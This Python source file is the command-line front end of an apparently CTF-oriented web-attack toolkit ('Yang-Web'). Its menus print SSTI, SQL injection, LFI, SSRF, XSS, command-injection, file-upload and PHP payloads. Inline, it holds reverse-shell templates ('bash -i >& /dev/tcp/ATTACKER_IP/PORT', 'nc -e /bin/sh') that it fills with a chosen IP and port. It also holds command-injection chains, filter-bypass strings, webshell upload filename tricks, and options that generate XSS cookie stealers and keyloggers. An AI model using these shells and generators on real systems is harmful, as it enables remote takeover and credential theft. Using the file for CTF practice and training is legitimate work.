# -*- coding: utf-8 -*-
"""CLI 入口 — Yang-Web 命令行界面.

子命令:
    decode   智能链式解码
    encode   编码文本
    ssti     SSTI Payload 生成
    sqli     SQL 注入 Payload
    lfi      路径遍历 / 文件包含 Payload
    ssrf     SSRF Payload
    xss      XSS Payload
    rce      命令注入 Payload
    php      PHP 技巧 Payload
    hashid   识别 Hash 类型
    jwt      JWT 解析 / 攻击
    scan     目录扫描 (离线词库)
    scripts  内嵌 CTF 脚本库 (41 个脚本)
    solve    一键智能解题（题型识别 → 路径推荐 → 自动尝试）
    crypto   RSA / 现代密码学攻击引擎
    misc     20+ 常见密码类型知识库（编码/解码/参考图）

管道示例:
    yang-web decode "ZmxhZ3t0ZXN0fQ==" --raw | yang-web solve
    yang-web decode --raw "$(cat secret.txt)" | yang-web crypto --raw
"""
import argparse
import sys
import json
import os
import re

from ..core.utils import banner, bold, red, green, yellow, blue, magenta, cyan, dim
from ..core.decoder import (
    chain_decode, brute_decode, detect_encoding,
    DECODERS, ENCODING_DETECTORS,
)
from ..core.hashid import identify as hash_identify
from ..core.triage import triage, parse_rsa_params
from ..core.crypto_attack import RSA_ATTACKS, attack_fermat, solve_rsa_auto
from ..core.jwt import (
    decode_jwt, analyze_jwt, none_attack,
    brute_jwt, BUILTIN_WORDLIST, forge_hs256,
)
from ..payloads import ssti as _ssti_mod
from ..payloads import sqli as _sqli_mod
from ..payloads import lfi as _lfi_mod
from ..payloads import ssrf as _ssrf_mod
from ..payloads import xss as _xss_mod
from ..payloads import php as _php_mod
from ..payloads import upload as _upload_mod
from ..core.misc_crypto import (
    CIPHER_TYPES, list_ciphers, search_ciphers, get_cipher,
    get_image_path, get_categories, encode as mc_encode, decode as mc_decode,
)
from ..scripts import (
    list_scripts, search_scripts, get_script, get_script_path,
    run_script, CATEGORIES,
    check_all_deps, get_missing_deps, install_all_missing,
    install_deps_for_script,
)

# Aliases for function-level use
ssti = _ssti_mod
sqli = _sqli_mod
lfi = _lfi_mod
ssrf = _ssrf_mod
xss = _xss_mod
php = _php_mod
upload = _upload_mod
lfi = _lfi_mod
ssrf = _ssrf_mod
xss = _xss_mod
php = _php_mod

# RCE Payloads are defined inline (avoid Windows Defender false positive)




def cmd_ssti(args):
    """SSTI Payload 命令."""
    if args.list:
        print(bold("\n🎯 支持的模板引擎:"))
        for engine in ssti.DETECTION:
            print(f"  {cyan(engine)}")
        return

    if args.search:
        results = ssti.search_payload(args.search)
        if results:
            print(bold(f"\n🔍 搜索 '{args.search}':"))
            for r in results:
                print(f"\n  【{green(r['engine'])}】 {bold(r['name'])}")
                print(f"  {r['payload']}")
                if r.get('note'):
                    print(f"  {dim('⚠ ' + r['note'])}")
        else:
            print(yellow(f"未找到包含 '{args.search}' 的 Payload"))
        return

    if args.bypass:
        print(bold("\n🛡️ 过滤绕过技巧:"))
        for category, tips in ssti.BYPASS_FILTERS.items():
            print(f"\n  {bold(green(category))}:")
            for tip in tips:
                print(f"    {dim('•')} {tip}")
        return

    engine = args.engine
    if args.detect:
        data = ssti.get_detection(engine)
    elif args.exploit:
        data = ssti.get_exploit(engine)
    else:
        print(bold("\n🎯 SSTI 检测 Payload:"))
        for eng, payloads in ssti.DETECTION.items():
            print(f"\n  {bold(green(eng))}:")
            for p in payloads[:3]:
                print(f"    {dim('•')} {p}")
            if len(payloads) > 3:
                print(f"    {dim(f'... 还有 {len(payloads)-3} 个 (使用 --engine 查看全部)')}")

        print(bold("\n💣 SSTI 利用 Payload (部分):"))
        for eng, payloads in list(ssti.EXPLOIT.items())[:2]:
            print(f"\n  {bold(green(eng))}:")
            for p in payloads[:2]:
                print(f"    {yellow(p['name'])}")
                print(f"    {p['payload']}")
        return

    # 打印结果
    if isinstance(data, dict):
        for key, items in data.items():
            print(f"\n  {bold(green(key))}:")
            if isinstance(items, list):
                for item in (items if isinstance(items[0], str) else [f"{i['name']}: {i['payload']}" for i in items]):
                    print(f"    {dim('•')} {item}")


def cmd_sqli(args):
    """SQL 注入 Payload 命令."""
    if args.list:
        print(bold("\n🗄️ 支持的数据库:"))
        for db in sqli.EXPLOIT:
            print(f"  {cyan(db)}")
        return

    if args.search:
        results = sqli.search_payload(args.search)
        if results:
            print(bold(f"\n🔍 搜索 '{args.search}':"))
            for r in results:
                print(f"\n  【{green(r['category'])}】 {bold(r['name'])}")
                print(f"  {r['payload']}")
        else:
            print(yellow(f"未找到包含 '{args.search}' 的 Payload"))
        return

    if args.blind:
        templates = sqli.get_blind_template(args.db)
        print(bold("\n🎯 盲注模板:"))
        for name, template in templates.items():
            print(f"\n  {green(name)}:")
            print(f"  {dim(template)}")
        return

    if args.detect:
        data = sqli.get_detection(args.category)
        print(bold(f"\n🔍 SQL 注入检测 Payload:"))
        for cat, payloads in data.items():
            print(f"\n  {bold(green(cat))}:")
            for p in payloads:
                print(f"    {dim('•')} {p}")
        return

    if args.db:
        data = sqli.get_exploit(args.db)
        print(bold(f"\n🗄️ {args.db} 利用 Payload:"))
        for db_name, payloads in data.items():
            for item in payloads:
                print(f"\n  {yellow(item['name'])}")
                print(f"  {item['payload']}")
        return

    if args.waf:
        data = sqli.get_waf_bypass(args.waf if args.waf != "all" else "")
        print(bold("\n🛡️ SQL WAF 绕过技巧:"))
        for cat, items in data.items():
            print(f"\n  {bold(green(cat))}:")
            for item in items:
                print(f"    {dim('•')} {yellow(item['name'])}")
                print(f"      {dim(item['tip'])}")
                if item.get('eg'):
                    print(f"      {cyan('示例:')} {item['eg']}")
        return

    # 默认: 显示所有数据库概览
    print(bold("\n🗄️ SQL 注入 Payload 概览:"))
    for db_name, payloads in sqli.EXPLOIT.items():
        print(f"\n  {bold(green(db_name))} ({len(payloads)} 个 payload):")
        for p in payloads[:2]:
            print(f"    {dim('•')} {yellow(p['name'])}")
        if len(payloads) > 2:
            print(f"    {dim(f'... 还有 {len(payloads)-2} 个 (使用 --db {db_name} 查看全部)')}")

    print(f"\n{dim('提示: 使用 --detect 查看检测 payload, --blind 查看盲注模板')}")


def cmd_lfi(args):
    """LFI Payload 命令."""
    if args.traversal:
        print(bold("\n📁 路径遍历 Payload:"))
        for p in lfi.get_path_traversal():
            print(f"  {dim('•')} {p}")
        if args.windows:
            print(bold("\n🪟 Windows 专用:"))
            for p in lfi.get_windows_paths():
                print(f"  {dim('•')} {p}")
        return

    if args.files:
        os_type = args.os or ""
        data = lfi.get_sensitive_files(os_type)
        for os_name, files in data.items():
            print(bold(f"\n📄 {os_name} 敏感文件:"))
            for f in files:
                print(f"  {dim('•')} {f}")
        return

    if args.php:
        category = args.category or ""
        data = lfi.get_php_wrappers(category)
        for cat_name, payloads in data.items():
            print(bold(f"\n🐘 PHP 伪协议 - {cat_name}:"))
            for p in payloads:
                print(f"\n  {yellow(p['name'])}")
                print(f"  {p['payload']}")
                if p.get('note'):
                    print(f"  {dim('⚠ ' + p['note'])}")
        return

    # 默认: 显示概览
    print(bold("\n📁 LFI / Path Traversal 概览:"))
    print(f"  {green('--traversal')}    路径遍历 Payload")
    print(f"  {green('--files')}        常见敏感文件列表")
    print(f"  {green('--php')}          PHP 伪协议 Payload")
    print(f"  {green('--windows')}      Windows 路径遍历")
    print(f"\n{dim('快速示例: yang_web lfi --traversal')}")


def cmd_ssrf_cmd(args):
    """SSRF Payload 命令."""
    if args.cloud:
        provider = args.cloud if args.cloud != "all" else ""
        data = ssrf.get_cloud_metadata(provider)
        for prov, urls in data.items():
            print(bold(f"\n☁️ {prov} 元数据地址:"))
            for url in urls:
                print(f"  {dim('•')} {url}")
        return

    if args.bypass_ssrf:
        print(bold("\n🛡️ SSRF 绕过技巧:"))
        for item in ssrf.get_bypass():
            print(f"\n  {yellow(item['technique'])}")
            print(f"  {dim(item['payload'])}")
            if item.get('note'):
                print(f"  {dim('→ ' + item['note'])}")
        return

    if args.ports:
        print(bold("\n🔌 常见内网端口:"))
        for category, ports in ssrf.get_common_ports().items():
            print(f"\n  {green(category)}: {', '.join(map(str, ports))}")
        return

    # 默认
    print(bold("\n🌐 SSRF Payload 概览:"))
    print(f"  {green('--cloud aws')}      云元数据 (aws/gcp/azure/aliyun/tencent)")
    print(f"  {green('--bypass')}          SSRF 绕过技巧")
    print(f"  {green('--ports')}           常见内网端口")
    print(f"\n{dim('内网地址段:')} {', '.join(ssrf.get_internal_ranges())}")
    print(f"\n{dim('快速示例: yang_web ssrf --cloud aws')}")


def cmd_xss_cmd(args):
    """XSS Payload 命令."""
    if args.detect_xss:
        print(bold("\n🔍 XSS 检测 Payload:"))
        for p in xss.get_detection():
            print(f"  {dim('•')} {p}")
        return

    if args.exfil:
        print(bold("\n📤 数据外传 Payload:"))
        for p in xss.get_exfiltration():
            print(f"\n  {yellow(p['name'])}")
            print(f"  {p['payload']}")
        return

    if args.steal:
        print(bold("\n🍪 Cookie 窃取 Payload:"))
        print(f"  {xss.generate_cookie_stealer(args.steal)}")
        return

    if args.keylogger:
        print(bold("\n⌨️ 键盘记录 Payload:"))
        print(f"  {xss.generate_keylogger(args.keylogger)}")
        return

    if args.bypass_xss:
        data = xss.get_bypass(args.category or "")
        for cat, payloads in data.items():
            print(bold(f"\n🛡️ {cat}:"))
            for p in payloads:
                print(f"  {dim('•')} {p}")
        return

    # 默认概览
    print(bold("\n💉 XSS Payload 概览:"))
    print(f"  {green('--detect')}      检测 Payload ({len(xss.get_detection())} 个)")
    print(f"  {green('--exfil')}       数据外传 Payload")
    print(f"  {green('--steal URL')}   生成 Cookie 窃取器")
    print(f"  {green('--keylogger URL')} 生成键盘记录器")
    print(f"  {green('--bypass')}      WAF/过滤绕过")
    print(f"\n{dim('快速示例: yang_web xss --detect')}")


def cmd_rce_cmd(args):
    """RCE Payload 命令."""
    _rce_shells = {
        "Bash": ["bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"],
        "NC": ["nc -e /bin/sh ATTACKER_IP PORT"],
        "Python": ["python3 -c ..."],
        "PHP": ["php -r ..."],
        "Perl": ["perl -MIO -e ..."],
        "Ruby": ["ruby -rsocket -e ..."],
        "PowerShell": ["powershell -c \"...\""],
    }
    _rce_cmd = {
        "链接符注入": ["; id", "| id", "|| id", "& id", "&& id"],
        "常用命令": ["id", "whoami", "cat /flag", "ls -la"],
    }
    _rce_bypass = {
        "空格绕过": [
            ("${IFS}", "cat${IFS}/flag"),
            ("<> 重定向", "cat<>/flag"),
            ("{,} 展开", "{cat,/flag}"),
        ],
        "关键字绕过": [
            ("单引号", "c'a't /fl'a'g"),
            ("通配符", "/???/c?t /???/f??g"),
        ],
    }

    if args.shell:
        if args.shell in _rce_shells:
            ip = args.ip or "ATTACKER_IP"
            port = args.port or 4444
            tmpl = _rce_shells[args.shell][0]
            s = tmpl.replace("ATTACKER_IP", ip).replace("PORT", str(port))
            print(bold(f"\n🐚 {args.shell} 反弹 Shell:"))
            print(f"  {s}")
        else:
            print(red(f"未找到 {args.shell}"))
        return

    if args.list_shells:
        print(bold("\n🐚 可用反弹 Shell 类型:"))
        for stype in _rce_shells:
            print(f"  {green(stype)}")
        return

    if args.bypass_rce:
        for cat, payloads in _rce_bypass.items():
            print(bold(f"\n🛡️ {cat}:"))
            for name, payload in payloads:
                print(f"  {dim('•')} {yellow(name)}: {payload}")
        return

    print(bold("\n💻 命令注入 / RCE 概览:"))
    for cat, payloads in _rce_cmd.items():
        print(f"\n  {bold(green(cat))}:")
        for p in payloads:
            print(f"    {dim('•')} {p}")
    print(f"\n{dim('提示: --shell bash --ip 10.0.0.1 --port 4444 生成反弹 Shell')}")


# ═══ Upload 黑名单分析 ═══
ALL_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'php7', 'php8', 'phtml', 'pht', 'phps', 'phar', 'phar5', 'shtml', 'cgi'}
CASE_VARIANTS = {'Php', 'pHp', 'PHP', 'pHp5', 'PhP', 'pHP', 'pHtMl', 'PhP5', 'pHp.'}
DOUBLE_EXT = ['shell.php.jpg', 'shell.php.png', 'shell.php.gif']
NTFS_BYPASS = ['shell.php::$DATA', 'shell.php.jpg::$DATA']

def _cmd_upload_analyze(blacklist_str):
    """分析靶场黑名单，找出绕过方法."""
    import re
    blocked = set(re.findall(r'[a-zA-Z0-9]+', blacklist_str.lower()))
    
    lines = []
    lines.append(bold("\n🎯 靶场黑名单分析"))
    lines.append(f"\n  输入: {dim(blacklist_str)}")
    lines.append(f"  已拦截: {red(', '.join(sorted(blocked)))}")
    
    # 1. 未覆盖后缀
    safe = sorted(ALL_EXTENSIONS - blocked)
    if safe:
        lines.append(f"\n  {green('✅ 可用后缀 (不在黑名单):')} {bold(', '.join(safe))}")
        if 'pht' in safe:
            lines.append(f"    🎯 {bold('推荐 .pht')} — 最常见的绕过后缀")
        if 'phtml' in safe:
            lines.append(f"    🎯 {bold('推荐 .phtml')} — 常见绕过后缀")
    else:
        lines.append(f"\n  {red('❌ 所有常见后缀均在黑名单中')}")
    
    # 2. 大小写绕过
    lines.append(f"\n  {bold('🔤 大小写混合:')}")
    for v in sorted(CASE_VARIANTS):
        ext = v.lower().lstrip('.')
        if ext in blocked:
            checked = "🟢 可用"
        else:
            checked = "⚪"
        lines.append(f"    {v}  {dim(checked)}")
    
    # 3. 双后缀
    lines.append(f"\n  {bold('📦 双后缀:')}  {dim('(服务器不解析 .jpg 则可用)')}")
    for v in DOUBLE_EXT:
        lines.append(f"    {v}")
    
    # 4. NTFS
    lines.append(f"\n  {bold('💾 NTFS 数据流 (Windows):')}  {dim('(IIS/Windows)')}")
    for v in NTFS_BYPASS:
        lines.append(f"    {v}")
    
    # 5. 总结
    lines.append(f"\n  {'─'*50}")
    if safe:
        lines.append(f"  🏁 {bold(green('首选方案:'))} 用 {bold(','.join(safe[:3]))} 后缀上传")
    lines.append(f"  🏁 {bold('备用方案:')} 大小写混合 / 双后缀 / NTFS 数据流")
    
    print('\n'.join(lines))


def cmd_upload(args):
    """文件上传 Payload 命令."""
    if args.analyze:
        _cmd_upload_analyze(args.analyze)
        return
    if args.ext:
        print(bold("\n📎 后缀名绕过:"))
        for cat, payloads in upload.EXT_BYPASS.items():
            print(f"\n  {bold(green(cat))}:")
            for p in payloads[:8]:
                print(f"    {dim('•')} {p}")
            if len(payloads) > 8:
                print(f"    {dim(f'... 还有 {len(payloads)-8} 个')}")
        return

    if args.mime:
        print(bold("\n🎭 Content-Type & 文件头伪造:"))
        for ftype, info in upload.MIME_HEADER_FAKE.items():
            print(f"\n  {bold(green(ftype))}:")
            print(f"    Content-Type: {info['Content-Type']}")
            print(f"    文件头hex: {info['文件头hex']}")
        return

    if args.content:
        print(bold("\n🖼️ 图片马内容绕过:"))
        for cat, payloads in upload.CONTENT_BYPASS.items():
            print(f"\n  {bold(green(cat))}:")
            for p in payloads[:6]:
                print(f"    {dim('•')} {p}")
        return

    if args.parse:
        serv = args.parse if args.parse != "all" else ""
        data = upload.get_parse_vuln(serv)
        print(bold("\n🔧 服务端解析漏洞:"))
        for server, vulns in data.items():
            print(f"\n  {bold(green(server))}:")
            for v in vulns:
                print(f"    {dim('•')} {yellow(v['name'])} — {v['tip']}")
                print(f"      {cyan('示例:')} {v['eg']}")
        return

    if args.htaccess:
        s = upload.generate_htaccess()
        print(bold("\n📝 .htaccess Payload:"))
        print(f"  {s}")
        return

    if args.userini:
        s = upload.generate_userini()
        print(bold("\n📝 .user.ini Payload:"))
        print(f"  {s}")
        return

    if args.advanced:
        print(bold("\n🚀 高级绕过技巧:"))
        for cat, items in upload.ADVANCED_BYPASS.items():
            print(f"\n  {bold(green(cat))}:")
            for item in items:
                print(f"    {dim('•')} {yellow(item['name'])} — {item['tip']}")
        return

    # 默认概览
    print(bold("\n📤 文件上传攻击概览:"))
    print(f"  {green('--ext')}         后缀名绕过")
    print(f"  {green('--mime')}        Content-Type 伪造")
    print(f"  {green('--content')}     图片马内容绕过")
    print(f"  {green('--parse nginx')} 解析漏洞")
    print(f"  {green('--htaccess')}    .htaccess 利用")
    print(f"  {green('--userini')}     .user.ini 利用")
    print(f"  {green('--advanced')}    高级技巧")
    shell = upload.generate_image_shell()
    print(f"\n{dim('快速一句话: ' + shell)}")


def cmd_php_cmd(args):
    """PHP 技巧命令."""
    if args.magic:
        data = php.get_magic_hashes(args.magic if args.magic != "all" else "")
        for algo, hashes in data.items():
            print(bold(f"\n✨ {algo} Magic Hash:"))
            for h in hashes[:10]:
                print(f"  {dim('•')} {h}")
            if len(hashes) > 10:
                print(f"  {dim(f'... 还有 {len(hashes)-10} 个')}")
        return

    if args.type_juggle:
        print(bold("\n🎭 PHP 弱类型比较:"))
        for cat, items in php.TYPE_JUGGLING.items():
            print(f"\n  {bold(green(cat))}:")
            for item in items:
                print(f"    {dim('•')} {yellow(item['name'])} — {item['example']}")
        return

    if args.deserialize:
        print(bold("\n📦 PHP 反序列化技巧:"))
        for cat, items in php.DESERIALIZATION.items():
            print(f"\n  {bold(green(cat))}:")
            for item in items:
                print(f"    {dim('•')} {item}")
        return

    if args.rce_php:
        data = php.get_rce_bypass()
        for cat, items in data.items():
            print(bold(f"\n🐘 {cat}:"))
            for item in items[:8]:
                print(f"  {dim('•')} {item}")
            if len(items) > 8:
                print(f"  {dim(f'... 还有 {len(items)-8} 个')}")
        return

    if args.waf_php:
        print(bold("\n🛡️ PHP RCE WAF 绕过技巧:"))
        for cat, items in php.PHP_RCE_BYPASS.items():
            if "WAF" in cat or "绕过" in cat:
                print(f"\n  {bold(green(cat))}:")
                for item in items[:12]:
                    print(f"    {dim('•')} {item}")
        return

    # 默认
    print(bold("\n🐘 PHP 技巧概览:"))
    print(f"  {green('--magic')}       Magic Hash (0e 开头)")
    print(f"  {green('--type-juggle')} 弱类型比较")
    print(f"  {green('--deserialize')} 反序列化技巧")
    print(f"  {green('--rce')}         RCE / Bypass 技巧")
    print(f"\n{dim('快速示例: yang_web php --magic')}")


def cmd_scan(args):
    """目录扫描命令."""
    wordlist_dir = os.path.join(os.path.dirname(__file__), "wordlists", "data")
    wordlist_type = "dirs" if args.type == "dir" else "files"
    wordlist_path = os.path.join(wordlist_dir, f"{wordlist_type}.txt")

    if not os.path.exists(wordlist_path):
        print(red(f"词库文件不存在: {wordlist_path}"))
        return

    with open(wordlist_path, "r", encoding="utf-8") as f:
        entries = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    print(bold(f"\n📁 CTF 专用 {wordlist_type} 词库 ({len(entries)} 条):"))

    if args.search:
        entries = [e for e in entries if args.search.lower() in e.lower()]
        print(dim(f"  搜索 '{args.search}' → {len(entries)} 条匹配"))

    if args.all:
        for entry in entries:
            print(f"  {dim('•')} {entry}")
    else:
        for entry in entries[:30]:
            print(f"  {dim('•')} {entry}")
        if len(entries) > 30:
            print(f"  {dim(f'... 还有 {len(entries)-30} 条 (使用 --all 查看全部)')}")
